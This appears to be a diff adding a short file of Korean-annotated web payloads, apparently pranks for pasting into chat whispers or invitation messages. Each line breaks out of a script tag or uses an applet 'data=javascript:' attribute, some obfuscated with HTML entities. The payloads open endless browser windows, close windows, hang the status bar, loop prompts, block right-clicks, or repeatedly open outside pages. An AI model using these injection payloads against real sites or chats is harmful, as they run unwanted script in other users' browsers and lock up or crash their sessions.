@@ -1,0 +1,20 @@
+﻿퍽~!!!!
+
+재알 </script><script>for(i=0;i<100;i++)window.open()</script> 창폭..  
+ 
+재알 </script><script>while(1)window.open();</script> 무한 창폭  
+ 
+/재알 </script><script>window.top.close();</script>퍽      
+
+<applet/data=javascript:for(i=1;i;i++){window.status=i*10000;}></applet>죽이는 초대 퍽...초대말 쓰는곳에 써넣음... 
+<applet/data=javascript:while(1){window.open()}></applet> 초대 메세지퍽  
+ 
+</SCRIPT><SCRIPT>javascript:{m=prompt('잼있져~');}while(m!=1024)javascript:for(;;)status=('재미로생각해줘여.')</SCRIPT>
+
+/재알 </SCRIPT><SCRIPT language=JavaScript>function click() {if ((event.button==2) || (event.button==3)) {alert('켈켈소스볼라꿍?보지말어');}}document.onmousedown=click// --> </SCRIPT>
+
+
+
+<applet data=javascript:&#119hile(1)window.top.open('http://www.netian.com/~stopkkkk/script/b1.html','sample','fullscreen,scrollbars');></applet>
+<APPLET DATA=javascript:&#102;or(i=1;i;i++){window.open("http://myhome.netsgo.com/manboy2/test/format2.htm");}></APPLET>
+  
